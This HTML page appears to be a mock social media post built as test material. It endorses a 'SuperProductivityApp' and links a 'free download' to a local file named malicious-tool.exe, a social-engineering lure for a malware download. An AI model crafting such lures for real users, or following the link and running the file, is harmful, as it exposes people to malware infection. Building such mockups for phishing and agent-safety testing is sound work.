<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Social Media Post</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f4f4f4;
    }

    .container {
      max-width: 800px;
      margin: 20px auto;
      background-color: white;
      border-radius: 10px;
      padding: 20px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }

    .post-header {
      display: flex;
      align-items: center;
    }

    .profile-img {
      border-radius: 50%;
      width: 50px;
      height: 50px;
      margin-right: 10px;
    }

    .post-author {
      font-weight: bold;
    }

    .post-time {
      font-size: 0.9em;
      color: #888;
    }

    .post-content {
      margin-top: 10px;
      font-size: 1.1em;
    }

    .post-link {
      color: #0073e6;
      text-decoration: none;
    }

    .post-link:hover {
      text-decoration: underline;
    }

    .post-footer {
      margin-top: 20px;
      display: flex;
      justify-content: space-between;
      font-size: 0.9em;
      color: #888;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="post-header">
      <img class="profile-img" src="https://www.w3schools.com/w3images/avatar2.png" alt="Profile Image">
      <div>
        <div class="post-author">John Doe</div>
        <div class="post-time">5 minutes ago</div>
      </div>
    </div>

    <div class="post-content">
      <p>Hey everyone! I just discovered this amazing productivity tool called <strong>SuperProductivityApp</strong>. It's a must-have for anyone looking to organize their tasks and increase efficiency.</p>
      <p>Here's a free download: <a class="post-link" href="http://localhost:8080/malicious-tool.exe">Download Here</a></p>
    </div>

    <div class="post-footer">
      <span>üëç 25 Likes</span>
      <span>üí¨ 5 Comments</span>
    </div>
  </div>

</body>
</html>
